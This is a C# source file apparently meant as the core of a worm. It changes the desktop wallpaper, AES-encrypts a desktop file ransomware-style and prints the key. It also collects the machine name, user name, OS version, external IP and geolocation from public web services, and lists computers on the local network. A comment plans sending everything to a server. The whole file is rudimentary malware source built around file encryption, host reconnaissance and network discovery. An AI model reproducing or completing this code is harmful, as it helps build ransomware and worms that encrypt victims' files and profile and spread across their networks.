using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using Newtonsoft.Json.Linq;
using System.DirectoryServices;

namespace worm_core_new
{
    class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;

        static byte[] encryptionKey;

        static void Main(string[] args)
        {
            // Change desktop background
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"C:/Users/Matthew/Pictures/Drivers License.JPG", SPIF_UPDATEINIFILE);

            //Encrypting file on desktop 
            Encrypt("C:/Users/Matthew/Desktop/matthew.txt", "C:/Users/Matthew/Desktop/matthew-encrypted.txt");
            Decrypt("C:/Users/Matthew/Desktop/matthew-encrypted.txt", "C:/Users/Matthew/Desktop/matthew-decrypted.txt");
    
            //Get system name, user logged in
            Console.WriteLine("MachineName: {0}", Environment.MachineName);
            Console.WriteLine("UserName: {0}", Environment.UserName);
            Console.WriteLine("OS version: {0}\n", Environment.OSVersion);

            //HTTP GET request for IP Address 
            WebClient client = new WebClient();
            string ipString = client.DownloadString("http://bot.whatismyipaddress.com/");
            Console.WriteLine("External IP address: {0}\n", ipString);

            //Location from keyboard layout or IP Address for another GET
            string location = client.DownloadString("http://ip-api.com/json/" + ipString);
            JObject json = JObject.Parse(location);
            Console.WriteLine("Location data:\n ");
            Console.WriteLine(json["city"] + ", " + json["regionName"] + " " + json["zip"] + " in the " + json["country"]);
            Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);
            Console.WriteLine();

            // List all computers on local network
            DirectoryEntry root = new DirectoryEntry("WinNT:");
            foreach (DirectoryEntry computers in root.Children)
            {
                foreach (DirectoryEntry computer in computers.Children)
                {
                    if (computer.Name != "Schema")
                    {
                        Console.WriteLine("Computer found: " + computer.Name + " " + computer.Path);
                    }
                }
            }

            // Call kade's function or work with kade to send everything to server

        }


        // function
        static void Encrypt(string source, string destination)
        {
            if (source == null | destination == null)
            {
                Console.WriteLine("No file name. We need a source and destination file ");
                return;

            }

            var sourceFilename = source;
            var destinationFilename = destination;
            var provider = new AesCryptoServiceProvider();
            var destinationStream = File.Create(destinationFilename);
            destinationStream.Write(provider.IV, 0, provider.IV.Length);

            using (var sourceStream = File.OpenRead(sourceFilename))
            using (var cryptoTransform = provider.CreateEncryptor())
            using (var cryptoStream = new CryptoStream(destinationStream, cryptoTransform, CryptoStreamMode.Write))
            {
                sourceStream.CopyTo(cryptoStream);
            }
            encryptionKey = provider.Key;
            Console.WriteLine("Encrytped file on desktop with key: " + System.Convert.ToBase64String(provider.Key) + "\n");

        }

        static void Decrypt(string source, string destination) 
        {
            var sourceFilename = source;
            var destinationFilename = destination;
            
            using (var sourceStream = File.OpenRead(sourceFilename))
            using (var destinationStream = File.Create(destinationFilename))
            using (var provider = new AesCryptoServiceProvider())
            {
                var IV = new byte[provider.IV.Length];
                sourceStream.Read(IV, 0, IV.Length);
                using (var cryptoTransform = provider.CreateDecryptor(encryptionKey, IV))
                using (var cryptoStream = new CryptoStream(sourceStream, cryptoTransform, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(destinationStream);
                }
            }
        }
    }
}
